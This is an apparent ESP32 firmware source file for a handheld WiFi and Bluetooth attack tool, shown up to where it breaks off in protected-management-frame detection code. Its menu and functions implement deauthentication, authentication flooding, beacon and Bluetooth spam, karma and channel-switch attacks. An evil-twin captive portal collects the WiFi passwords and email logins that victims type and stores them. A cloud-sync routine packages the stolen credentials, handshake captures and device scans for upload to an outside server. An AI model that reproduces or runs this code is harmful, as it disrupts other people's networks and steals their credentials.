#include <Arduino.h>
#include <WiFi.h>
#include <TFT_eSPI.h>
#include <esp_wifi.h>
#include <ping/ping_sock.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>
#include <ArduinoOTA.h>
#include <HTTPClient.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include "disclaimer.h"
#include "attack_engine.h"
#include "karma.h"
#include "templates.h"
#include "bt_spam.h"
#include "state_machine.h"
#include "wifi_state.h"
#include "ui_helpers.h"
#include "ui_icons.h"



TFT_eSPI tft = TFT_eSPI();
Preferences prefs;
Preferences apPrefs;

#define BTN_TOP 0
#define BTN_BOTTOM 35
#define BAT_PIN 34
#define FW_VERSION "3.1"
// Kredensial opsional dari src/secrets.h (file lokal, TIDAK di-commit).
#if __has_include("secrets.h")
  #include "secrets.h"
#endif

#ifndef NISKALA_WIFI_SSID
  #define NISKALA_WIFI_SSID ""
#endif
#ifndef NISKALA_WIFI_PASS
  #define NISKALA_WIFI_PASS ""
#endif
#ifndef NISKALA_SYNC_API_KEY
  #define NISKALA_SYNC_API_KEY ""
#endif


const int MAX_VERIFY_ATTEMPTS = 5;
const unsigned long VERIFY_TIMEOUT_MS = 6000;
const unsigned long RELEASE_DELAY_MS = 2000;
const unsigned long SUCCESS_HOLD_MS = 4000;

State currentState = MAIN_MENU;

#include "web_remote.h"
#include "recon.h"
#include "cloud.h"
#include "ble_scan.h"
#include "ota.h"
#include "macro.h"
#include "client_monitor.h"
#include "cli.h"
#include "eapol.h"
#include "smart_attack.h"
#include "ui_screens.h"
#include "telemetry.h"

int menuSelection = 0;
int menuScrollPos = 0;
extern const int MENU_COUNT = 20;
const char* menuItems[] = {
  "DEAUTH MANUAL",
  "EVIL TWIN",
  "BEACON SPAM",
  "PROBE SNIFF",
  "GLOBAL DEAUTH",
  "AUTH FLOOD",
  "BLUETOOTH SPAM",
  "PASSWORD",
  "KARMA ATTACK",
  "CSA ATTACK",
  "WEB REMOTE",
  "OTA UPDATE",
  "BLE SCAN",
  "CLOUD SYNC",
  "MACRO",
  "CLIENT MONITOR",
  "NETWORK RECON",
  "AP WIFI",
  "EAPOL CAPTURE",
  "SMART ATTACK"
};

volatile AttackMode g_attackMode = ATK_IDLE;
volatile uint32_t g_packetsSent = 0;
volatile uint32_t g_txErrors = 0;
uint8_t g_originalApMac[6] = {0,0,0,0,0,0};
volatile bool g_victimFound = false;
uint8_t g_victimMAC[6] = {0};
uint8_t g_targetBSSID[6] = {0};
volatile uint8_t g_targetChannel = 1;
char g_csaTargetSSID[33] = {0};

// Parameter serangan runtime (diubah via Web Remote, disimpan di NVS)
int cfg_deauth_burst = 5;
int cfg_auth_burst = 20;
int cfg_hop_interval_ms = 120;
int cfg_beacon_hop_ms = 100;
int cfg_deauth_reason = 0;
String cfg_wifi_ssid = NISKALA_WIFI_SSID;
String cfg_wifi_pass = NISKALA_WIFI_PASS;
String cfg_server_url = "https://niskalasys.my.id/sync.php";
String cfg_template_url = "https://niskalasys.my.id/template.html";
String g_customTemplate = "";
bool useCustomTemplate = false;
int cfg_autosync_min = 0;
unsigned long lastAutoSync = 0;


unsigned long evilTwinStartTime = 0;

ProbeEntry g_probeLog[PROBE_LOG_SIZE];
volatile int g_probeLogHead = 0;
volatile int g_probeLogCount = 0;
portMUX_TYPE g_probeLogMux = portMUX_INITIALIZER_UNLOCKED;

// Karma data
KarmaSSIDEntry g_karmaSSIDs[KARMA_MAX_SSIDS];
int g_karmaSSIDCount = 0;
KarmaClientEntry g_karmaClients[KARMA_MAX_CLIENTS];
int g_karmaClientCount = 0;
volatile uint32_t g_karmaResponses = 0;
volatile bool g_karmaActiveMode = true;

// Karma UI state
bool isKarmaRunning = false;
unsigned long karmaScanStart = 0;
int karmaSelection = 0;
int karmaScrollPos = 0;

bool isDeauthRunning = false;
bool isEvilTwinRunning = false;
bool isBeaconRunning = false;
bool isProbeRunning = false;
bool isGlobalDeauthRunning = false;
bool isAuthFloodRunning = false;
bool isBTSpamRunning = false;
bool isCSARunning = false;             // [CSA]
bool isWebRemoteRunning = false;
bool isMacroRunning = false;
int macroIndex = 0;
int macroPhase = 0;
int macroSelection = 0;
unsigned long macroPhaseStart = 0;

// Screensaver (dim + particle orbit)
bool screensaverActive = false;
unsigned long lastActivity = 0;
unsigned long lastScreensaverDraw = 0;
int screensaverFrame = 0;
#define SCREENSAVER_IDLE_MS 45000
#define BL_DIM 51
#define BL_FULL 255
bool isClientMonitorRunning = false;
int clientSelection = 0;
int clientScroll = 0;
ClientEntry g_clients[CLIENT_MAX];
int g_clientCount = 0;
portMUX_TYPE g_clientMux = portMUX_INITIALIZER_UNLOCKED;

#define RECON_MAX_HOSTS 20
#define RECON_MAX_PORTS 14
#define MAX_AP_WIFI 20
#define RECON_PHASE_CONNECTING 0
#define RECON_PHASE_SWEEP 1
#define RECON_PHASE_HOST_LIST 2
#define RECON_PHASE_PORT_SCAN 3
#define RECON_PHASE_BANNER 4
#define RECON_PHASE_PORT_RESULT 5
IPAddress g_reconHosts[RECON_MAX_HOSTS];
int g_reconHostCount = 0;
int g_reconSelection = 0;
int g_reconScroll = 0;
int g_reconPhase = RECON_PHASE_HOST_LIST;
int g_reconOpenPorts[RECON_MAX_PORTS];
int g_reconOpenPortCount = 0;
IPAddress g_reconSelectedIP;
bool isReconRunning = false;
int g_reconSelectedAuth = -1;
uint32_t g_reconFirst = 0;
uint32_t g_reconLast = 0;
uint32_t g_reconNext = 0;
uint32_t g_reconTotal = 0;
uint32_t g_reconScanned = 0;
unsigned long g_reconConnectStart = 0;
int g_reconPortIndex = 0;
int g_reconBannerIndex = 0;
IPAddress g_reconLocalIP;
IPAddress g_reconGateway;
IPAddress g_reconSubnet;
char g_reconBanners[RECON_MAX_PORTS][40];
WiFiClient g_reconClient;


bool transientActive = false;
unsigned long transientUntil = 0;
uint8_t transientMode = 0;
String targetSSID = "";
int apCount = 0;
int selectedIdx = 0;
int g_scanPendingMenu = -1;
int g_scanFrame = 0;
unsigned long g_scanLastDraw = 0;
int apScrollPos = 0;

int selectedTemplateIdx = 0;
int templateSelection = 0;

int viewSelection = 0;
int viewScrollPos = 0;
bool confirmDeleteAll = false;
unsigned long lastDeletePress = 0;
int apWifiSelection = 0;
int apWifiScrollPos = 0;
bool confirmApWifiDelete = false;
unsigned long lastApWifiDeletePress = 0;
const int MAX_SAVED_PWDS = 50;

DNSServer dnsServer;
WebServer server(80);
String capturedEmail = "";
String capturedPass = "";
bool isReleasing = false;
bool isVerifying = false;
bool verificationResult = false;
unsigned long releaseTimer = 0;
unsigned long verifyStart = 0;
const byte DNS_PORT = 53;

int verifyState = 0;
int verifyAttempts = 0;
unsigned long releaseAfterSuccess = 0;

TaskHandle_t attackTaskHandle = NULL;

// ═══════════════════════════════════════════════
// HTML halaman status portal
// ═══════════════════════════════════════════════
const char HTML_VERIFYING[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="10;url=/">
<title>Memverifikasi</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.spin{border:4px solid #eef2f5;border-top:4px solid #1e88e5;border-radius:50%;
width:52px;height:52px;animation:sp .9s linear infinite;margin:0 auto 20px}
@keyframes sp{to{transform:rotate(360deg)}}
h2{margin:0 0 8px;color:#1e88e5;font-size:20px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="spin"></div><h2>Memverifikasi...</h2>
<p>Mohon tunggu sebentar</p></div></body></html>
)raw";

const char HTML_SUCCESS[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Terhubung</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.ok{width:64px;height:64px;border-radius:50%;background:#22c55e;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#22c55e;font-size:22px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="ok">&#10003;</div>
<h2>Terhubung!</h2><p>Anda sekarang online</p></div></body></html>
)raw";

const char HTML_ERROR[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Password Salah</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.err{width:64px;height:64px;border-radius:50%;background:#ef4444;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#ef4444;font-size:22px}p{margin:0 0 22px;color:#6b7280;font-size:14px}
a{display:inline-block;padding:14px 32px;background:#1e88e5;color:#fff;text-decoration:none;
border-radius:10px;font-weight:600;font-size:15px}
</style></head><body><div class="card"><div class="err">&#10005;</div>
<h2>Password Salah</h2><p>Silakan coba lagi</p><a href="/">Coba Lagi</a></div></body></html>
)raw";

// ═══════════════════════════════════════════════
// UI helpers
// ═══════════════════════════════════════════════
void savePasswordToNVS(String email, String pass) {
  int count = prefs.getInt("pwd_count", 0);
  if (count < MAX_SAVED_PWDS) {
    prefs.putString(("pwd_" + String(count)).c_str(), email + "|" + pass);
    prefs.putULong(("pwd_ts_" + String(count)).c_str(), millis());
    prefs.putInt("pwd_count", count + 1);
  }
}

void deletePasswordEntry(int idx) {
  int total = prefs.getInt("pwd_count", 0);
  if (idx < 0 || idx >= total) return;
  for (int i = idx; i < total - 1; i++) {
    prefs.putString(("pwd_" + String(i)).c_str(), prefs.getString(("pwd_" + String(i + 1)).c_str(), ""));
    prefs.putULong(("pwd_ts_" + String(i)).c_str(), prefs.getULong(("pwd_ts_" + String(i + 1)).c_str(), 0));
  }
  prefs.remove(("pwd_" + String(total - 1)).c_str());
  prefs.remove(("pwd_ts_" + String(total - 1)).c_str());
  prefs.putInt("pwd_count", total - 1);
}
void updatePasswordVerification(bool ok) {
  int count = prefs.getInt("pwd_count", 0);
  if (count <= 0) return;
  String key = "pwd_" + String(count - 1);
  String entry = prefs.getString(key.c_str(), "");
  int p1 = entry.indexOf('|');
  if (p1 < 0) return;
  String email = entry.substring(0, p1);
  String rest = entry.substring(p1 + 1);
  int p2 = rest.indexOf('|');
  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
  prefs.putString(key.c_str(), email + "|" + pass + "|" + (ok ? "1" : "0"));
}
void deleteAllPasswordsFromNVS() {
  prefs.clear();
  viewSelection = 0; viewScrollPos = 0;
}

void saveConfig() {
  prefs.putInt("cfg_deauth", cfg_deauth_burst);
  prefs.putInt("cfg_auth", cfg_auth_burst);
  prefs.putInt("cfg_hop", cfg_hop_interval_ms);
  prefs.putInt("cfg_beacon", cfg_beacon_hop_ms);
  prefs.putInt("cfg_reason", cfg_deauth_reason);
  prefs.putString("wifi_ssid", cfg_wifi_ssid);
  prefs.putString("wifi_pass", cfg_wifi_pass);
  prefs.putString("srv_url", cfg_server_url);
  prefs.putString("tpl_url", cfg_template_url);
  prefs.putInt("autosync", cfg_autosync_min);
}

// ═══════════════════════════════════════════════
// Web handlers
// ═══════════════════════════════════════════════
void handleRoot() {
  if (isWebRemoteRunning) {
    server.send_P(200, "text/html", HTML_REMOTE);
    return;
  }
  if (verifyState == 2) {
    server.send_P(200, "text/html", HTML_SUCCESS);
    return;
  }
  if (verifyState == 3) {
    verifyState = 0;
    server.send_P(200, "text/html", HTML_ERROR);
    return;
  }
  if (isReleasing || isVerifying || verifyState == 1) {
    server.send_P(200, "text/html", HTML_VERIFYING);
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}

void handleLogin() {
  if (server.hasArg("password")) {
    capturedPass = server.arg("password");
    if (server.hasArg("email") && server.arg("email").length() > 0) {
      capturedEmail = server.arg("email");
    } else {
      capturedEmail = "WiFi-Pass";
    }
    Serial.printf("[LOGIN] %s / %s\n", capturedEmail.c_str(), capturedPass.c_str());
    savePasswordToNVS(capturedEmail, capturedPass);
    isReleasing = true;
    releaseTimer = millis();
    verifyState = 1;
    server.send_P(200, "text/html", HTML_VERIFYING);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}

void handleNotFound() {
  if (isWebRemoteRunning) {
    server.sendHeader("Location", "http://192.168.4.1/rc", true);
    server.send(302, "text/plain", "");
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}

// ═══════════════════════════════════════════════
// Engine control
// ═══════════════════════════════════════════════
void applyPromiscuousFilter(bool probeOnly) {
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = probeOnly
    ? WIFI_PROMIS_FILTER_MASK_MGMT
    : (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
  esp_wifi_set_promiscuous_filter(&filter);
}

// ── Karma ──
void startKarmaScan() {
  memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
  memset(g_karmaClients, 0, sizeof(g_karmaClients));
  g_karmaSSIDCount = 0;
  g_karmaClientCount = 0;
  g_karmaResponses = 0;
  g_karmaActiveMode = true;

  radioSetMode(RADIO_AP_STA);
  delay(200);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
    delay(300);
  }

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  g_attackMode = ATK_KARMA;
  isKarmaRunning = true;
  karmaScanStart = millis();
  Serial.println("[KARMA] Scan started (20s, active mode)");
}

void stopKarmaScan() {
  isKarmaRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
  Serial.println("[KARMA] Scan stopped");
}

// ── Deauth ──
void startDeauthEngine() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    radioSetMode(RADIO_OFF);
    delay(50);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d), pakai MAC existing\n", macErr);
      }
      delay(50);
    }
    radioSetMode(RADIO_AP_STA);
    WiFi.softAP("Deauther_Fix", "12345678", 1, 1); delay(400);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isDeauthRunning = true;
  g_attackMode = ATK_DEAUTH_TARGET;
}

void stopDeauthEngine() {
  isDeauthRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startAuthFlood() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  g_packetsSent = 0;
  g_txErrors = 0;
  isAuthFloodRunning = true;
  g_attackMode = ATK_AUTH_FLOOD;
}

void stopAuthFlood() {
  isAuthFloodRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startGlobalDeauth() {
  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
  }
  esp_wifi_set_promiscuous(false);
  g_packetsSent = 0;
  g_txErrors = 0;
  isGlobalDeauthRunning = true;
  g_attackMode = ATK_DEAUTH_GLOBAL;
}

void stopGlobalDeauth() {
  isGlobalDeauthRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startBeaconSpam() {
  if (!isWebRemoteRunning) {
    radioSetMode(RADIO_AP);
    restoreOriginalApMac();
    WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
  } else {
    radioSetMode(RADIO_AP_STA);
  }
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  g_packetsSent = 0;
  g_txErrors = 0;
  isBeaconRunning = true;
  g_attackMode = ATK_BEACON;
}

void stopBeaconSpam() {
  isBeaconRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startProbeSniffer() {
  if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  if (!isWebRemoteRunning) {
    restoreOriginalApMac();
    WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
  }
  portENTER_CRITICAL(&g_probeLogMux);
  g_probeLogHead = 0; g_probeLogCount = 0;
  portEXIT_CRITICAL(&g_probeLogMux);
  applyPromiscuousFilter(true);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  isProbeRunning = true;
  g_attackMode = ATK_PROBE;
}

void stopProbeSniffer() {
  isProbeRunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
}

void startBTSpam() {
  radioSetMode(RADIO_OFF);
  if (btSpamInit()) {
    isBTSpamRunning = true;
    g_attackMode = ATK_IDLE;
  }
}

void stopBTSpam() {
  btSpamStop();
  isBTSpamRunning = false;
  resetWifiStateAfterAttack();
}

// ── CSA  [PATCH 2] ──
void startCSAAttack() {
  if (isWebRemoteRunning) {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
  } else {
    if (WiFi.getMode() != WIFI_AP_STA) radioSetMode(RADIO_AP_STA);
    uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
    if (memcmp(mac, g_targetBSSID, 6) != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] CSA set_mac failed (%d)\n", macErr);
      }
      delay(50);
    }
    WiFi.softAP("CSA_Init", "12345678", 1, 1); delay(300);
  }
  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(100);

  strncpy(g_csaTargetSSID, targetSSID.c_str(), 32);
  g_csaTargetSSID[32] = 0;

  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isCSARunning = true;
  g_attackMode = ATK_CSA;
  Serial.printf("[CSA] Started on BSSID %02X:%02X:%02X:%02X:%02X:%02X ch=%d SSID=%s\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel, g_csaTargetSSID);
}

void stopCSAAttack() {
  isCSARunning = false;
  g_attackMode = ATK_IDLE;
  resetWifiStateAfterAttack();
  Serial.println("[CSA] Stopped");
}

// ── Web Remote ──
void startWebRemote() {
  radioSetMode(RADIO_AP_STA);
  delay(200);
  restoreOriginalApMac();
  WiFi.softAP("NISKALA_CTRL", "niskala123", 1, 0, 4);
  delay(300);
  server.begin();
  dnsServer.start(53, "*", WiFi.softAPIP());
  isWebRemoteRunning = true;
  Serial.println("[WEB] Remote control aktif");
  drawWebRemoteScreen();
}

void stopWebRemote() {
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
  isWebRemoteRunning = false;
  Serial.println("[WEB] Remote control berhenti");
}

// Cloud Sync (kirim hasil ke hosting)
// ------------------------------------------------------------------
String buildSyncJson() {
  String mac = WiFi.macAddress();
  String j = "{\"device\":\"NISKALA\",\"mac\":\"" + mac + "\",\"uptime\":" + String(millis() / 1000) + ",";

  // probe log
  j += "\"probe\":[";
  portENTER_CRITICAL(&g_probeLogMux);
  int cnt = g_probeLogCount;
  int head = g_probeLogHead;
  ProbeEntry snap[PROBE_LOG_SIZE];
  for (int i = 0; i < cnt; i++) {
    int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    snap[i] = g_probeLog[idx];
  }
  portEXIT_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < cnt; i++) {
    if (i) j += ",";
    char m[18];
    snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
             snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
             snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
    String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
    j += "{\"mac\":\"" + String(m) + "\",\"rssi\":" + String(snap[i].rssi) + ",\"ssid\":\"" + jsonEscape(ssid) + "\"}";
  }
  j += "],";

  // karma
  j += "\"karma\":[";
  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (i) j += ",";
    j += "{\"ssid\":\"" + jsonEscape(String(g_karmaSSIDs[i].ssid)) + "\",\"probe_count\":" + String(g_karmaSSIDs[i].probeCount) + ",\"auth_count\":" + String(g_karmaSSIDs[i].authCount) + "}";
  }
  j += "],";

  // passwords
  int total = prefs.getInt("pwd_count", 0);
  j += "\"passwords\":[";
  for (int i = 0; i < total; i++) {
    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
    int p1 = entry.indexOf('|');
    String email = (p1 > 0) ? entry.substring(0, p1) : entry;
    String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
    int p2 = rest.indexOf('|');
    String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
    String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
    if (i) j += ",";
    j += "{\"email\":\"" + jsonEscape(email) + "\",\"password\":\"" + jsonEscape(pass) + "\",\"verified\":\"" + ver + "\"}";
  }
  j += "],\"eapol\":" + buildEapolJson() + ",\"ble\":[\n";
  for (int i = 0; i < g_bleScanCount; i++) {
    if (i) j += ",";
    j += "{\"mac\":\"" + String(g_bleScanLog[i].mac) + "\",\"name\":\"" + jsonEscape(String(g_bleScanLog[i].name)) + "\",\"rssi\":" + String(g_bleScanLog[i].rssi) + ",\"seen_count\":" + String(g_bleScanLog[i].seenCount) + "}";
  }
  j += "]}";
  return j;
}

void stopAttacksKeepWebRemote() {
  if (isDeauthRunning) { isDeauthRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBeaconRunning) isBeaconRunning = false;
  if (isAuthFloodRunning) isAuthFloodRunning = false;
  if (isGlobalDeauthRunning) isGlobalDeauthRunning = false;
  if (isProbeRunning) { isProbeRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBTSpamRunning) { btSpamStop(); isBTSpamRunning = false; }
  if (isCSARunning) { isCSARunning = false; esp_wifi_set_promiscuous(false); }
  if (isKarmaRunning) { isKarmaRunning = false; esp_wifi_set_promiscuous(false); }
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    server.stop();
    dnsServer.stop();
    esp_wifi_set_promiscuous(false);
  }
  g_attackMode = ATK_IDLE;
}

// Hentikan semua modul serangan tanpa merusak AP kontrol saat idle
void stopAllAttacks() {
  if (isDeauthRunning) stopDeauthEngine();
  if (isBeaconRunning) stopBeaconSpam();
  if (isAuthFloodRunning) stopAuthFlood();
  if (isGlobalDeauthRunning) stopGlobalDeauth();
  if (isProbeRunning) stopProbeSniffer();
  if (isBTSpamRunning) stopBTSpam();
  if (isCSARunning) stopCSAAttack();
  if (isKarmaRunning) stopKarmaScan();
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    verifyAttempts = 0;
    server.stop();
    dnsServer.stop();
    resetWifiStateAfterAttack();
  }
  g_attackMode = ATK_IDLE;
}

// ── Evil Twin  [PATCH 5 MAC cloning] ──
void stopEvilTwin();

String getBestDiscoveredSSID() {
  String best = "";
  int bestCount = 0;

  portENTER_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < g_probeLogCount; i++) {
    int idx = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    if (g_probeLog[idx].ssid[0] != 0 && (int)g_probeLog[idx].count > bestCount) {
      best = String(g_probeLog[idx].ssid);
      bestCount = g_probeLog[idx].count;
    }
  }
  portEXIT_CRITICAL(&g_probeLogMux);

  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (g_karmaSSIDs[i].ssid[0] != 0 && (int)g_karmaSSIDs[i].probeCount > bestCount) {
      best = String(g_karmaSSIDs[i].ssid);
      bestCount = g_karmaSSIDs[i].probeCount;
    }
  }
  return best;
}

void startEvilTwinWithDeauth() {
  radioSetMode(RADIO_AP_STA);
  delay(100);
  restoreOriginalApMac();

  String safeSSID = targetSSID;
  if (safeSSID.length() == 0) {
    safeSSID = getBestDiscoveredSSID();
    if (safeSSID.length() == 0) {
      safeSSID = "Free_WiFi";
    } else {
      Serial.printf("[EVIL TWIN] SSID hidden -> pakai hasil Probe/Karma: %s\n", safeSSID.c_str());
    }
  }

  bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
  if (!apSuccess) {
    Serial.println("[ERROR] Gagal membuat AP Palsu!");
    stopEvilTwin();
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  delay(250);

  uint8_t fakeMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
  Serial.printf("[EVIL TWIN] Fake AP: SSID=%s MAC=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                safeSSID.c_str(),
                fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
                g_targetChannel);

  IPAddress IP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", IP);
  server.begin();

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isReleasing = false;
  isVerifying = false;
  isEvilTwinRunning = true;
  g_attackMode = ATK_EVIL_TWIN;
  evilTwinStartTime = millis();

  Serial.printf("Evil Twin Started. Target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel,
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
}
void stopEvilTwin() {
  isEvilTwinRunning = false;
  isReleasing = false;
  isVerifying = false;
  verifyState = 0;
  useCustomTemplate = false;
  g_attackMode = ATK_IDLE;
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
}

// ═══════════════════════════════════════════════
// PMF detection
// ═══════════════════════════════════════════════
// ------------------------------------------------------------------
// Deteksi PMF (802.11w) presisi via parsing RSN capabilities beacon
// ------------------------------------------------------------------
volatile bool g_pmfFound = false;
volatile bool g_pmfEnabled = false;
uint8_t g_pmfBSSID[6] = {0};

void pmfCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;
  if (sig_len < 24) return;

  uint8_t subtype = (p[0] >> 4) & 0x0F;
  if (subtype != 0x08) return; // beacon
  if (memcmp(&p[16], g_pmfBSSID, 6) != 0) return;

  int pos = 36; // 24 header + 12 fixed params
  while (pos + 2 <= sig_len) {
    uint8_t eid = p[pos];
    uint8_t len = p[pos + 1];
    if (pos + 2 + len > sig_len) break;

    if (eid == 0x30) { // RSN IE
      int d = pos + 2;
      int dlen = len;
      if (dlen >= 8) {
        uint16_t pcount = p[d + 6] | (p[d + 7] << 8);
        int off = d + 8 + pcount * 4;
